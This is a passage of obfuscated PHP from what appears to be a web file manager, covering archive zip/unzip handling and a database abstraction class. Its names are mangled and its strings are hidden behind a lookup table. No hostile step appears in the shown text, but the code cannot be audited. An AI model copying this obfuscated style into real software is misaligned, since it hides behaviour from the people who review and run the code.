$‡ÔåŠÙ¡[1260], $‡ÔåŠÙ¡[12]); $×ñ£“‰Ÿ = $‹Ú‰ú¦; } $Š®ñä¿° = IO::info($×ñ£“‰Ÿ); if (!$Š®ñä¿° || !$Š®ñä¿°[$‡ÔåŠÙ¡[233]]) { show_json(LNG($‡ÔåŠÙ¡[1261]), !1); } $¯ûÖ—šÉ = self::zipFileList($€ğ”½¹ö, $‹Ú‰ú¦); foreach ($¯ûÖ—šÉ as $÷³»‡ç => $Çù¢ù) { $¯ûÖ—šÉ[$÷³»‡ç] = self::iconvSystem($Çù¢ù); } $š‹½Ú¨ = get_filename_auto($×ñ£“‰Ÿ . $öÔıÛ˜, $‡ÔåŠÙ¡[12], $ª¢§¨í£); KodArchive::create(self::iconvSystem($š‹½Ú¨), $¯ûÖ—šÉ); if (!IO::exist($š‹½Ú¨)) { if ($‹Ú‰ú¦) { del_dir($‹Ú‰ú¦); } write_log($‡ÔåŠÙ¡[1262] . $š‹½Ú¨, $‡ÔåŠÙ¡[373]); show_json(LNG($‡ÔåŠÙ¡[1263]), !1); } if (!$‹Ú‰ú¦) { return $š‹½Ú¨; } $ƒŠ÷á…è = self::move($š‹½Ú¨, $ì„èˆÜÁ, $ª¢§¨í£); if ($‹Ú‰ú¦) { del_dir($‹Ú‰ú¦); } if (!$š‹½Ú¨) { write_log($‡ÔåŠÙ¡[1264] . $š‹½Ú¨ . $‡ÔåŠÙ¡[1265] . $ì„èˆÜÁ, $‡ÔåŠÙ¡[373]); show_json(LNG($‡ÔåŠÙ¡[1263]), !1); } return $ƒŠ÷á…è; } public static function unzip($ŞØõÜÜ•, $£úÅ·, $¼º¬òğÚ = "\55\x31", $ÔÖ¼²öÛ = "\162\x65\160\x6c\x61\143\145") { $éÌ£Í¬— =& $_SERVER[÷åé¼î]; $…æÖÈàØ = parent::info($ŞØõÜÜ•); if (!$…æÖÈàØ) { show_json(LNG($éÌ£Í¬—[1266]), !1); } $¸¨è²ŠÁ = IO::infoFullSimple($£úÅ·); if (!$¸¨è²ŠÁ) { $£úÅ· = IO::mkdir($£úÅ·); } if (isset($¸¨è²ŠÁ[$éÌ£Í¬—[193]]) && trim($¸¨è²ŠÁ[$éÌ£Í¬—[87]], $éÌ£Í¬—[8]) != trim($£úÅ·, $éÌ£Í¬—[8])) { $¦Ã˜š—Œ = KodIO::make($¸¨è²ŠÁ[$éÌ£Í¬—[192]]); $°“Öœû½ = IO::fileNameAuto($¦Ã˜š—Œ, $¸¨è²ŠÁ[$éÌ£Í¬—[32]], REPEAT_RENAME_FOLDER, !0); $£úÅ· = IO::mkdir($¦Ã˜š—Œ . $°“Öœû½); } $¼º¬òğÚ = $¼º¬òğÚ && $¼º¬òğÚ != $éÌ£Í¬—[1267] ? @json_decode($¼º¬òğÚ, !0) : -1; $Ç³Ù¢Ä· = self::unzipPart($ŞØõÜÜ•, $¼º¬òğÚ); if (!$Ç³Ù¢Ä· || !IO::exist($Ç³Ù¢Ä·[$éÌ£Í¬—[230]])) { show_json(LNG($éÌ£Í¬—[108]), !1); } $„Ó¢‹Œ = $Ç³Ù¢Ä·[$éÌ£Í¬—[1268]][count($Ç³Ù¢Ä·[$éÌ£Í¬—[1268]]) - 1]; if ($„Ó¢‹Œ[$éÌ£Í¬—[1269]] == -1 || substr($„Ó¢‹Œ[$éÌ£Í¬—[32]], -1, 1) == $éÌ£Í¬—[8]) { $¥¨ºŞ®š = $Ç³Ù¢Ä·[$éÌ£Í¬—[1270]] . rand_string(10) . $éÌ£Í¬—[8]; mk_dir($¥¨ºŞ®š); $²êƒˆœÃ = count($Ç³Ù¢Ä·[$éÌ£Í¬—[1268]]) == 1 ? IO::ext($ŞØõÜÜ•) : get_path_ext($Ç³Ù¢Ä·[$éÌ£Í¬—[230]]); $ˆì¯´• = KodArchive::extract(self::iconvSystem($Ç³Ù¢Ä·[$éÌ£Í¬—[230]]), $¥¨ºŞ®š, $„Ó¢‹Œ[$éÌ£Í¬—[1269]], $°“Öœû½, $²êƒˆœÃ); self::unzipErrorCheck($ˆì¯´•, array($éÌ£Í¬—[1271], $ŞØõÜÜ•, $²êƒˆœÃ, $£úÅ·, $Ç³Ù¢Ä·)); Hook::trigger($éÌ£Í¬—[1272], $¥¨ºŞ®š); recursion_dir($¥¨ºŞ®š, $ŞÑÕ³˜˜, $éÊÅØ™¤, 0); $ÁÅ•÷Î = array_merge($ŞÑÕ³˜˜, $éÊÅØ™¤); $¹ÜÒ°Ø = array(); foreach ($ÁÅ•÷Î as $—Å“ºû…) { $À„×éà§ = IO::move(self::iconvApp($—Å“ºû…), $£úÅ·, $ÔÖ¼²öÛ); if ($À„×éà§) { $¹ÜÒ°Ø[] = $À„×éà§; } } del_dir($¥¨ºŞ®š); } else { $À„×éà§ = IO::move($Ç³Ù¢Ä·[$éÌ£Í¬—[230]], $£úÅ·, $ÔÖ¼²öÛ, get_path_this($„Ó¢‹Œ[$éÌ£Í¬—[32]])); if ($À„×éà§) { $¹ÜÒ°Ø[] = $À„×éà§; } } return $¹ÜÒ°Ø ? $¹ÜÒ°Ø : !1; } public static function unzipList($ö•ÆÂç°) { $½Ì¢Ó¼­ =& $_SERVER[÷åé¼î]; $ôÏ’¯ôè = isset($ö•ÆÂç°[$½Ì¢Ó¼­[1273]]) ? $ö•ÆÂç°[$½Ì¢Ó¼­[1273]] : !1; $ÉªŠüÂ = isset($ö•ÆÂç°[$½Ì¢Ó¼­[1269]]) ? @json_decode($ö•ÆÂç°[$½Ì¢Ó¼­[1269]], !0) : -1; $Ô×è‹ÇÌ = self::unzipPart($ö•ÆÂç°[$½Ì¢Ó¼­[87]], $ÉªŠüÂ); if (!$Ô×è‹ÇÌ || !IO::exist($Ô×è‹ÇÌ[$½Ì¢Ó¼­[230]])) { show_json(LNG($½Ì¢Ó¼­[108]), !1); } $æ„Üø¨ = $Ô×è‹ÇÌ[$½Ì¢Ó¼­[1268]][count($Ô×è‹ÇÌ[$½Ì¢Ó¼­[1268]]) - 1]; $çœ°Áì´ = in_array(IO::ext($Ô×è‹ÇÌ[$½Ì¢Ó¼­[230]]), array($½Ì¢Ó¼­[373], $½Ì¢Ó¼­[1274], $½Ì¢Ó¼­[1275], $½Ì¢Ó¼­[1276], $½Ì¢Ó¼­[1277], $½Ì¢Ó¼­[1278])); if (!$ôÏ’¯ôè && ($æ„Üø¨[$½Ì¢Ó¼­[1269]] == -1 || $çœ°Áì´)) { $Å•ĞÁâº = $Ô×è‹ÇÌ[$½Ì¢Ó¼­[1270]] . get_path_this($Ô×è‹ÇÌ[$½Ì¢Ó¼­[230]]) . $½Ì¢Ó¼­[1279]; if (!IO::exist($Å•ĞÁâº)) { $‚¹ï”Á† = $æ„Üø¨[$½Ì¢Ó¼­[1269]] == -1 ? get_path_ext(IO::pathThis($ö•ÆÂç°[$½Ì¢Ó¼­[87]])) : get_path_ext($Ô×è‹ÇÌ[$½Ì¢Ó¼­[230]]); $üôñé÷Œ = KodArchive::listContent(self::iconvSystem($Ô×è‹ÇÌ[$½Ì¢Ó¼­[230]]), !0, $‚¹ï”Á†); self::unzipErrorCheck($üôñé÷Œ, array($½Ì¢Ó¼­[1280], $ö•ÆÂç°, $Ô×è‹ÇÌ)); @file_put_contents($Å•ĞÁâº, json_encode($üôñé÷Œ[$½Ì¢Ó¼­[1281]])); } return @json_decode(IO::getContent($Å•ĞÁâº), !0); } IO::fileOut($Ô×è‹ÇÌ[$½Ì¢Ó¼­[230]], $ôÏ’¯ôè, get_path_this($æ„Üø¨[$½Ì¢Ó¼­[32]])); die; } private static function zipFileList($Ì³¨åÑº, $‹â¯‰ªš = false) { $ŠÏëŠ±§ =& $_SERVER[÷åé¼î]; $²âú§ = array(); foreach ($Ì³¨åÑº as $ºìäü³) { $ŠÂƒÖ–“ = $ºìäü³[$ŠÏëŠ±§[87]]; if ($‹â¯‰ªš) { $ŠÂƒÖ–“ = self::copy($ºìäü³[$ŠÏëŠ±§[87]], $‹â¯‰ªš, $ŠÏëŠ±§[883]); } else { $Î»Üë½ = self::init($ºìäü³[$ŠÏëŠ±§[87]]); if ($Î»Üë½->getType() == $ŠÏëŠ±§[109]) { $ŠÂƒÖ–“ = $Î»Üë½->path; } } if ($ŠÂƒÖ–“ && self::local()->exist($ŠÂƒÖ–“)) { $²âú§[$ºìäü³[$ŠÏëŠ±§[87]]] = $ŠÂƒÖ–“; } } if (!empty($²âú§)) { return array_values($²âú§); } show_json(LNG($ŠÏëŠ±§[1240]), !1); } private static function localFilePath($¹´í‹ò) { $‚ãË«¥ =& $_SERVER[÷åé¼î]; $İø©ú’÷ = KodIO::parse($¹´í‹ò); if ($İø©ú’÷[$‚ãË«¥[33]] == KodIO::KOD_SOURCE) { $ŒíĞÔ·• = Model($‚ãË«¥[889])->fileInfoGet(KodIO::sourceID($¹´í‹ò)); if (!$ŒíĞÔ·•[$‚ãË«¥[87]]) { show_json($‚ãË«¥[1282], !1); } $¹´í‹ò = $ŒíĞÔ·•[$‚ãË«¥[87]]; } $ˆ ´ğ´Æ = self::init($¹´í‹ò); if ($ˆ ´ğ´Æ->pathParse[$‚ãË«¥[1226]]) { $¹´í‹ò = $ˆ ´ğ´Æ->pathParse[$‚ãË«¥[1226]]; $ˆ ´ğ´Æ = self::init($¹´í‹ò); } $”š®¨¾² = $ˆ ´ğ´Æ->getType(); if ($”š®¨¾² == $‚ãË«¥[109] || $”š®¨¾² == $‚ãË«¥[1283]) { if (!$ˆ ´ğ´Æ->exist($ˆ ´ğ´Æ->path)) { show_json(LNG($‚ãË«¥[108]), !1); } return $ˆ ´ğ´Æ->path; } return !1; } public static function unzipPart($èıêÚœ, $¯Í÷ä­± = -1) { $á¸¯•˜ =& $_SERVER[÷åé¼î]; $è½ŸáÓ = IO::pathThis($èıêÚœ); if (!$¯Í÷ä­± || $¯Í÷ä­± == -1) { $±¡ğÏªù = array(array($á¸¯•˜[32] => $è½ŸáÓ, $á¸¯•˜[1269] => -1)); $±¡ğÏªù[0][$á¸¯•˜[1284]] = $±¡ğÏªù[0][$á¸¯•˜[32]]; } else { if (is_array($¯Í÷ä­±)) { $±¡ğÏªù = $¯Í÷ä­±; $ÌÕº½Ú­ = count($±¡ğÏªù) - 1; for ($Ç‹İë”ä = 0; $Ç‹İë”ä <= $ÌÕº½Ú­; $Ç‹İë”ä++) { $¶³­ˆ±Ø = $±¡ğÏªù[$Ç‹İë”ä]; $î†ç¹ï‰ = get_path_this($¶³­ˆ±Ø[$á¸¯•˜[32]]) . (checkExtSafe($¶³­ˆ±Ø[$á¸¯•˜[32]]) ? $á¸¯•˜[12] : $á¸¯•˜[1285]); $±¡ğÏªù[$Ç‹İë”ä][$á¸¯•˜[1284]] = $á¸¯•˜[1286] . intval($¶³­ˆ±Ø[$á¸¯•˜[1269]]) . $á¸¯•˜[446] . $î†ç¹ï‰; if ($Ç‹İë”ä == 0) { continue; } $±¡ğÏªù[$Ç‹İë”ä][$á¸¯•˜[1284]] = $±¡ğÏªù[$Ç‹İë”ä - 1][$á¸¯•˜[1284]] . $á¸¯•˜[1287] . $±¡ğÏªù[$Ç‹İë”ä][$á¸¯•˜[1284]]; } } } if (!is_array($±¡ğÏªù) || count($±¡ğÏªù) == 0) { return !1; } $®ˆé»›è = $±¡ğÏªù[count($±¡ğÏªù) - 1]; if (!IO::exist($èıêÚœ)) { return !1; } $ÒÔ£—»ı = TEMP_FILES . $á¸¯•˜[1288] . kodIO::hashPathSafe($èıêÚœ) . $á¸¯•˜[8]; $»ƒ½‚Œ¹ = $ÒÔ£—»ı . $®ˆé»›è[$á¸¯•˜[1284]]; mk_dir($ÒÔ£—»ı); file_put_contents(TEMP_FILES . $á¸¯•˜[1260], $á¸¯•˜[12]); if (IO::exist($»ƒ½‚Œ¹)) { return array($á¸¯•˜[230] => $»ƒ½‚Œ¹, $á¸¯•˜[1268] => $±¡ğÏªù, $á¸¯•˜[1270] => $ÒÔ£—»ı); } $¾û¸ÁÈ = self::localFilePath($èıêÚœ); if (!$¾û¸ÁÈ) { $¾û¸ÁÈ = $ÒÔ£—»ı . $á¸¯•˜[1289]; if (!IO::exist($¾û¸ÁÈ)) { self::copy($èıêÚœ, $ÒÔ£—»ı, !1, get_path_this($¾û¸ÁÈ)); } } if (!$¾û¸ÁÈ || !IO::exist($¾û¸ÁÈ)) { return !1; } if ($®ˆé»›è[$á¸¯•˜[1269]] == -1) { return array($á¸¯•˜[230] => $¾û¸ÁÈ, $á¸¯•˜[1268] => $±¡ğÏªù, $á¸¯•˜[1270] => $ÒÔ£—»ı); } $©ÉÇÑÑÃ = $¾û¸ÁÈ; foreach ($±¡ğÏªù as $Ç‹İë”ä => $¶³­ˆ±Ø) { if (!$¶³­ˆ±Ø || $¶³­ˆ±Ø[$á¸¯•˜[1269]] == $á¸¯•˜[1267]) { break; } if (substr($¶³­ˆ±Ø[$á¸¯•˜[32]], -1, 1) == $á¸¯•˜[8]) { break; } $ı„İÂè£ = in_array(get_path_ext($¶³­ˆ±Ø[$á¸¯•˜[1284]]), array($á¸¯•˜[373], $á¸¯•˜[1274], $á¸¯•˜[1275], $á¸¯•˜[1276], $á¸¯•˜[1277], $á¸¯•˜[1278])); $é•¥¯€Ã = $Ç‹İë”ä == count($±¡ğÏªù) - 1 && $ı„İÂè£; $Ã‚Ú¤§µ = $ÒÔ£—»ı . $¶³­ˆ±Ø[$á¸¯•˜[1284]]; $›ŒÂÌç = $ÒÔ£—»ı . get_path_this($¶³­ˆ±Ø[$á¸¯•˜[32]]); if (IO::exist($Ã‚Ú¤§µ)) { $©ÉÇÑÑÃ = $Ã‚Ú¤§µ; continue; } $‹õ¤Íñ = $Ç‹İë”ä == 0 ? get_path_ext($è½ŸáÓ) : get_path_ext($©ÉÇÑÑÃ); $°°á¢“¢ = KodArchive::extract(self::iconvSystem($©ÉÇÑÑÃ), $ÒÔ£—»ı, $¶³­ˆ±Ø[$á¸¯•˜[1269]], $ĞÕÀêûË, $‹õ¤Íñ); self::unzipErrorCheck($°°á¢“¢, array($á¸¯•˜[1290], $èıêÚœ, $±¡ğÏªù, $¶³­ˆ±Ø, $Ã‚Ú¤§µ)); if (IO::exist($›ŒÂÌç)) { IO::rename($›ŒÂÌç, get_path_this($Ã‚Ú¤§µ)); } $©ÉÇÑÑÃ = $Ã‚Ú¤§µ; } $»ƒ½‚Œ¹ = $©ÉÇÑÑÃ; return array($á¸¯•˜[230] => $©ÉÇÑÑÃ, $á¸¯•˜[1268] => $±¡ğÏªù, $á¸¯•˜[1270] => $ÒÔ£—»ı); } private static function unzipErrorCheck($ıŠÛ­¶», $‹£§Ïöß = false) { $İå‹ë‡€ =& $_SERVER[÷åé¼î]; if ($ıŠÛ­¶»[$İå‹ë‡€[1291]]) { return !0; } write_log(array($İå‹ë‡€[1292], $ıŠÛ­¶», $‹£§Ïöß), $İå‹ë‡€[1293]); show_json($İå‹ë‡€[1294] . json_encode($ıŠÛ­¶»[$İå‹ë‡€[1281]]), !1); die; } } goto BŸºË‘À³; f¯é÷àó¸¶: class DbSqlite extends DbSqliteBase { public function query($šÔÀãÄÏ) { $¿½Ò â =& $_SERVER[÷åé¼î]; if (!CacheLock::fileLock($¿½Ò â[13])) { return !1; } $¸Õ¡·„æ = parent::query($šÔÀãÄÏ); CacheLock::fileUnLock($¿½Ò â[13]); return $¸Õ¡·„æ; } public function execute($ÆûÓö¼) { $ÉşŠóØ‚ =& $_SERVER[÷åé¼î]; if (!CacheLock::fileLock($ÉşŠóØ‚[13])) { return !1; } $·Å««ÔÔ = parent::execute($ÆûÓö¼); CacheLock::fileUnLock($ÉşŠóØ‚[13]); return $·Å««ÔÔ; } } class DbSqlite3 extends DbSqlite3Base { public function query($˜àë…œ) { $´ìûƒÊ =& $_SERVER[÷åé¼î]; if (!CacheLock::fileLock($´ìûƒÊ[13])) { return !1; } $ñ¿«ğÀ¿ = parent::query($˜àë…œ); CacheLock::fileUnLock($´ìûƒÊ[13]); return $ñ¿«ğÀ¿; } public function execute($Ší÷ËÃî) { $¿´ô† =& $_SERVER[÷åé¼î]; if (!CacheLock::fileLock($¿´ô†[13])) { return !1; } $ßÜî˜‚À = parent::execute($Ší÷ËÃî); CacheLock::fileUnLock($¿´ô†[13]); return $ßÜî˜‚À; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\156\145\x71" => "\x3c\76", "\147\x74" => "\76", "\x65\x67\x74" => "\x3e\75", "\154\164" => "\x3c", "\145\154\164" => "\74\75", "\x6e\157\164\x6c\151\x6b\145" => "\x4e\x4f\124\40\x4c\111\113\105", "\154\151\x6b\145" => "\114\111\113\x45", "\151\x6e" => "\x49\116", "\x6e\157\164\151\156" => "\116\x4f\x54\40\111\116", "\x6e\x6f\x74\x20\151\156" => "\116\x4f\x54\40\111\116", "\142\145\x74\167\x65\145\156" => "\x42\105\x54\127\105\105\x4e", "\x6e\x6f\x74\142\x65\164\x77\145\145\x6e" => "\x4e\x4f\124\40\102\x45\124\x57\105\x45\x4e", "\156\x6f\x74\x20\142\x65\x74\x77\x65\145\156" => "\116\x4f\x54\x20\x42\105\124\x57\x45\x45\x4e"); protected $selectSql = "\123\105\114\105\x43\124\45\104\111\x53\x54\111\x4e\x43\x54\x25\x20\45\106\x49\105\x4c\x44\45\x20\x46\x52\117\115\x20\x25\124\101\102\x4c\105\x25\45\112\x4f\x49\116\45\x25\x57\110\x45\122\x45\x25\x25\x47\122\x4f\125\x50\x25\45\x48\x41\126\111\116\107\45\x25\117\122\x44\105\x52\x25\x25\x4c\x49\115\x49\124\45\40\45\125\x4e\111\x4f\x4e\x25\45\103\x4f\115\x4d\105\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $ì†Ø£§¤ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[÷åé¼î][1032], $ì†Ø£§¤); } public function factory($¨­šµó¸ = '') { $ Ğ×¯± =& $_SERVER[÷åé¼î]; $¨­šµó¸ = $this->parseConfig($¨­šµó¸); if (empty($¨­šµó¸[$ Ğ×¯±[1033]])) { think_exception(think_lang($ Ğ×¯±[1034])); } $this->dbType = ucwords(strtolower($¨­šµó¸[$ Ğ×¯±[1033]])); $ÜòÊ°ìå = $ Ğ×¯±[1035] . $this->dbType; if (class_exists($ÜòÊ°ìå)) { $”·óÚ­ = new $ÜòÊ°ìå($¨­šµó¸); if ($ Ğ×¯±[1036] != strtolower($¨­šµó¸[$ Ğ×¯±[1033]])) { $”·óÚ­->dbType = strtoupper($this->dbType); } else { $”·óÚ­->dbType = $this->_getDsnType($¨­šµó¸[$ Ğ×¯±[988]]); } } else { think_exception(think_lang($ Ğ×¯±[1037]) . $ Ğ×¯±[1038] . $ÜòÊ°ìå); } return $”·óÚ­; } public function __call($ªğ´†ïø, $´ŸÏÊÓĞ) { if (method_exists($this, $ªğ´†ïø)) { return call_user_func_array(array($this, $ªğ´†ïø), $´ŸÏÊÓĞ); } } protected function _getDsnType($´½Ö©—) { $Ø«™ÑÌÖ = explode($_SERVER[÷åé¼î][4], $´½Ö©—); $À‹ş±Ô÷ = strtoupper(trim($Ø«™ÑÌÖ[0])); return $À‹ş±Ô÷; } private function parseConfig($¸ÃÅ˜•Õ = '') { $­Ï¾Ş³¸ =& $_SERVER[÷åé¼î]; if (!empty($¸ÃÅ˜•Õ) && is_string($¸ÃÅ˜•Õ)) { $¸ÃÅ˜•Õ = $this->parseDSN($¸ÃÅ˜•Õ); } elseif (is_array($¸ÃÅ˜•Õ)) { $¸ÃÅ˜•Õ = array_change_key_case($¸ÃÅ˜•Õ); $¸ÃÅ˜•Õ = array($­Ï¾Ş³¸[1033] => $¸ÃÅ˜•Õ[$­Ï¾Ş³¸[1039]], $­Ï¾Ş³¸[960] => $¸ÃÅ˜•Õ[$­Ï¾Ş³¸[1040]], $­Ï¾Ş³¸[961] => $¸ÃÅ˜•Õ[$­Ï¾Ş³¸[1041]], $­Ï¾Ş³¸[958] => $¸ÃÅ˜•Õ[$­Ï¾Ş³¸[1042]], $­Ï¾Ş³¸[959] => $¸ÃÅ˜•Õ[$­Ï¾Ş³¸[1043]], $­Ï¾Ş³¸[21] => $¸ÃÅ˜•Õ[$­Ï¾Ş³¸[1044]], $­Ï¾Ş³¸[988] => $¸ÃÅ˜•Õ[$­Ï¾Ş³¸[1045]], $­Ï¾Ş³¸[17] => isset($¸ÃÅ˜•Õ[$­Ï¾Ş³¸[1046]]) ? $¸ÃÅ˜•Õ[$­Ï¾Ş³¸[1046]] : array()); } elseif (empty($¸ÃÅ˜•Õ)) { if (think_config($­Ï¾Ş³¸[1047]) && $­Ï¾Ş³¸[1036] != strtolower(think_config($­Ï¾Ş³¸[1048]))) { $¸ÃÅ˜•Õ = $this->parseDSN(think_config($­Ï¾Ş³¸[1047])); } else { $¸ÃÅ˜•Õ = array($­Ï¾Ş³¸[1033] => think_config($­Ï¾Ş³¸[1048]), $­Ï¾Ş³¸[960] => think_config($­Ï¾Ş³¸[1049]), $­Ï¾Ş³¸[961] => think_config($­Ï¾Ş³¸[1050]), $­Ï¾Ş³¸[958] => think_config($­Ï¾Ş³¸[1051]), $­Ï¾Ş³¸[959] => think_config($­Ï¾Ş³¸[1052]), $­Ï¾Ş³¸[21] => think_config($­Ï¾Ş³¸[307]), $­Ï¾Ş³¸[988] => think_config($­Ï¾Ş³¸[1047]), $­Ï¾Ş³¸[17] => think_config($­Ï¾Ş³¸[1053])); } } return $¸ÃÅ˜•Õ; } protected function initConnect($Ã¬ëà†© = true) { if (1 == think_config($_SERVER[÷åé¼î][22])) { $this->_linkID = $this->multiConnect($Ã¬ëà†©); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $…²‹ğœ‡ => $ Óó¡´£) { $this->_linkID = $ Óó¡´£; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($çç×óõ = false) { $¤Î¸š… =& $_SERVER[÷åé¼î]; static $èŒŒ¦Ö€ = array(); static $ŠÒĞ˜ı = -1; if (empty($èŒŒ¦Ö€)) { foreach ($this->config as $Ü«Û¢¯Ü => $Ù¨À¸é„) { $èŒŒ¦Ö€[$Ü«Û¢¯Ü] = explode($¤Î¸š…[50], $Ù¨À¸é„); } } if (think_config($¤Î¸š…[1054])) { if ($çç×óõ || think_config($¤Î¸š…[455]) === !0) { $Œ…éÁÒñ = floor(mt_rand(0, think_config($¤Î¸š…[1055]) - 1)); $ŠÒĞ˜ı = $Œ…éÁÒñ; } else { if (is_numeric(think_config($¤Î¸š…[1056]))) { $Œ…éÁÒñ = think_config($¤Î¸š…[1056]); } else { $Œ…éÁÒñ = floor(mt_rand(think_config($¤Î¸š…[1055]), count($èŒŒ¦Ö€[$¤Î¸š…[958]]) - 1)); } } } else { $Œ…éÁÒñ = floor(mt_rand(0, count($èŒŒ¦Ö€[$¤Î¸š…[958]]) - 1)); $ŠÒĞ˜ı = $Œ…éÁÒñ; } $Œ…éÁÒñ = $ŠÒĞ˜ı !== -1 ? $ŠÒĞ˜ı : $Œ…éÁÒñ; $ö÷ó·½ñ = array($¤Î¸š…[960] => isset($èŒŒ¦Ö€[$¤Î¸š…[960]][$Œ…éÁÒñ]) ? $èŒŒ¦Ö€[$¤Î¸š…[960]][$Œ…éÁÒñ] : $èŒŒ¦Ö€[$¤Î¸š…[960]][0], $¤Î¸š…[961] => isset($èŒŒ¦Ö€[$¤Î¸š…[961]][$Œ…éÁÒñ]) ? $èŒŒ¦Ö€[$¤Î¸š…[961]][$Œ…éÁÒñ] : $èŒŒ¦Ö€[$¤Î¸š…[961]][0], $¤Î¸š…[958] => isset($èŒŒ¦Ö€[$¤Î¸š…[958]][$Œ…éÁÒñ]) ? $èŒŒ¦Ö€[$¤Î¸š…[958]][$Œ…éÁÒñ] : $èŒŒ¦Ö€[$¤Î¸š…[958]][0], $¤Î¸š…[959] => isset($èŒŒ¦Ö€[$¤Î¸š…[959]][$Œ…éÁÒñ]) ? $èŒŒ¦Ö€[$¤Î¸š…[959]][$Œ…éÁÒñ] : $èŒŒ¦Ö€[$¤Î¸š…[959]][0], $¤Î¸š…[21] => isset($èŒŒ¦Ö€[$¤Î¸š…[21]][$Œ…éÁÒñ]) ? $èŒŒ¦Ö€[$¤Î¸š…[21]][$Œ…éÁÒñ] : $èŒŒ¦Ö€[$¤Î¸š…[21]][0], $¤Î¸š…[988] => isset($èŒŒ¦Ö€[$¤Î¸š…[988]][$Œ…éÁÒñ]) ? $èŒŒ¦Ö€[$¤Î¸š…[988]][$Œ…éÁÒñ] : $èŒŒ¦Ö€[$¤Î¸š…[988]][0], $¤Î¸š…[17] => isset($èŒŒ¦Ö€[$¤Î¸š…[17]][$Œ…éÁÒñ]) ? $èŒŒ¦Ö€[$¤Î¸š…[17]][$Œ…éÁÒñ] : $èŒŒ¦Ö€[$¤Î¸š…[17]][0]); return $this->connect($ö÷ó·½ñ, $Œ…éÁÒñ); } public function parseDSN($ƒ»±ÃÍü) { $¯§¹Åà  =& $_SERVER[÷åé¼î]; if (empty($ƒ»±ÃÍü)) { return !1; } $†ş†Ò» = parse_url($ƒ»±ÃÍü); if ($†ş†Ò»[$¯§¹Åà [207]]) { $ÙÃÜæ” = array($¯§¹Åà [1033] => $†ş†Ò»[$¯§¹Åà [207]], $¯§¹Åà [960] => isset($†ş†Ò»[$¯§¹Åà [646]]) ? $†ş†Ò»[$¯§¹Åà [646]] : $¯§¹Åà [12], $¯§¹Åà [961] => isset($†ş†Ò»[$¯§¹Åà [1057]]) ? $†ş†Ò»[$¯§¹Åà [1057]] : $¯§¹Åà [12], $¯§¹Åà [958] => isset($†ş†Ò»[$¯§¹Åà [208]]) ? $†ş†Ò»[$¯§¹Åà [208]] : $¯§¹Åà [12], $¯§¹Åà [959] => isset($†ş†Ò»[$¯§¹Åà [209]]) ? $†ş†Ò»[$¯§¹Åà [209]] : $¯§¹Åà [12], $¯§¹Åà [21] => isset($†ş†Ò»[$¯§¹Åà [87]]) ? substr($†ş†Ò»[$¯§¹Åà [87]], 1) : $¯§¹Åà [12]); } else { preg_match($¯§¹Åà [1058], trim($ƒ»±ÃÍü), $ÔÍñãÙá); $ÙÃÜæ” = array($¯§¹Åà [1033] => $ÔÍñãÙá[1], $¯§¹Åà [960] => $ÔÍñãÙá[2], $¯§¹Åà [961] => $ÔÍñãÙá[3], $¯§¹Åà [958] => $ÔÍñãÙá[4], $¯§¹Åà [959] => $ÔÍñãÙá[5], $¯§¹Åà [21] => $ÔÍñãÙá[6]); } $ÙÃÜæ”[$¯§¹Åà [988]] = $¯§¹Åà [12]; return $ÙÃÜæ”; } protected function debug() { $İ©àë” =& $_SERVER[÷åé¼î]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $İ©àë”[1059]; if (think_config($İ©àë”[1060])) { think_status($İ©àë”[1061]); think_trace($this->queryStr . $İ©àë”[1062] . think_status($İ©àë”[24], $İ©àë”[1061], 6) . $İ©àë”[1063], $İ©àë”[12], $İ©àë”[1064]); } } protected function parseLock($ªàíŸ° = false) { $¡…şÑ‹ª =& $_SERVER[÷åé¼î]; if (!$ªàíŸ°) { return $¡…şÑ‹ª[12]; } if ($¡…şÑ‹ª[990] == $this->dbType) { return $¡…şÑ‹ª[1065]; } return $¡…şÑ‹ª[1066]; } protected function parseSet($ú›¶õ¿) { $û‹ßÚ÷ =& $_SERVER[÷åé¼î]; foreach ($ú›¶õ¿ as $Á‹Ø€Î => $†›ßü°â) { if (is_array($†›ßü°â) && $û‹ßÚ÷[357] == $†›ßü°â[0]) { $Äƒ¿¨˜[] = $this->parseKey($Á‹Ø€Î) . $û‹ßÚ÷[956] . $†›ßü°â[1]; } elseif (is_scalar($†›ßü°â) || is_null($†›ßü°â)) { $Äƒ¿¨˜[] = $this->parseKey($Á‹Ø€Î) . $û‹ßÚ÷[956] . $this->parseValue($†›ßü°â); } } return $û‹ßÚ÷[1067] . implode($û‹ßÚ÷[50], $Äƒ¿¨˜); } protected function bindParam($ÈÚ¯ÇŞÉ, $ˆóøëıÌ) { $this->bind[$_SERVER[÷åé¼î][4] . $ÈÚ¯ÇŞÉ] = $ˆóøëıÌ; } protected function parseBind($şôš¯­¬) { $şôš¯­¬ = array_merge($this->bind, $şôš¯­¬); $this->bind = array(); return $şôš¯­¬; } function parseKey(&$Œúïœ©Â, $Â¸ƒÅ¬ = true) { if ($Â¸ƒÅ¬) { $Œúïœ©Â = $this->parseKeyCheck($Œúïœ©Â); } return $Œúïœ©Â; } function parseKeyCheck($’úÉ²şÎ) { $‰Î¾í¸ =& $_SERVER[÷åé¼î]; $’úÉ²şÎ = trim($’úÉ²şÎ); if (!preg_match($‰Î¾í¸[1068], $’úÉ²şÎ)) { think_exception($‰Î¾í¸[1069] . $’úÉ²şÎ); } return $’úÉ²şÎ; } protected function parseValue($Ì»ÕÁë¶) { $ò“Áîı© =& $_SERVER[÷åé¼î]; if (is_string($Ì»ÕÁë¶)) { $Ì»ÕÁë¶ = $ò“Áîı©[1029] . $this->escapeString($Ì»ÕÁë¶) . $ò“Áîı©[1029]; } elseif (isset($Ì»ÕÁë¶[0]) && is_string($Ì»ÕÁë¶[0]) && strtolower($Ì»ÕÁë¶[0]) == 